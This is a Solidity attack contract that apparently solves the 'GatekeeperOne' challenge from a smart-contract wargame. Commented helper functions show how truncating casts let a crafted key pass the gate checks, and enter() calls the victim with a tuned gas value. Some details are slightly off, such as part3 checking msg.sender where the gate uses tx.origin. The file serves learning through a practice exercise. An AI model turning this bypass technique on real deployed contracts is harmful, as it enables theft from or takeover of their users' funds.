pragma solidity ^0.8.0;


contract AttackGatekeeperOne {
    address public victim;

    constructor(address _victim) public {
        victim = _victim;
    }

    // require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
    // require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
    // require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");

    function part1(bytes8 _gateKey) public pure returns(bool) {
        // Downcasting from a bigger uint to a smaller uint truncates from the left
        // so going from uint64 to uint16 will remove the first 12 characters.
        // For this to pass, we need to ensure that characters 9-12 are 0s
        // So for example, something like 0000000000001234 will work since
        // it'll compare 00001234 with 1234
        return uint32(uint64(_gateKey)) == uint16(uint64(_gateKey));
    }

    function part2(bytes8 _gateKey) public pure returns(bool) {
        // This is saying that the truncated version of the _gateKey cannot match the original
        // e.g. Using 0000000000001234 will fail because the return values for both are equal
        // However, as long as you can change any of the first 8 characters, this will pass e.g. 1122334400001234
        return uint32(uint64(_gateKey)) != uint64(_gateKey);
    }

    function part3(bytes8 _gateKey) public view returns(bool) {
        // _gateKey has 16 hexidecimal characters
        // uint16(msg.sender) truncates everything else but the last 4 characters of your address (for mine, it's BeC2)
        // The rest is the same as part 1 so this function will return true for any _gateKeys with the value
        // 0x********0000BeC2 where * represents any hexidecimal characters (0-f) except 0000
        return uint32(uint64(_gateKey)) == uint16(uint160(address(msg.sender)));
    }

    function enter(bytes8 _key) public returns(bool) {
        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", _key);
        (bool success,) = victim.call{gas: 185362}(payload);
        require(success, "failed somewhere...");
    }
}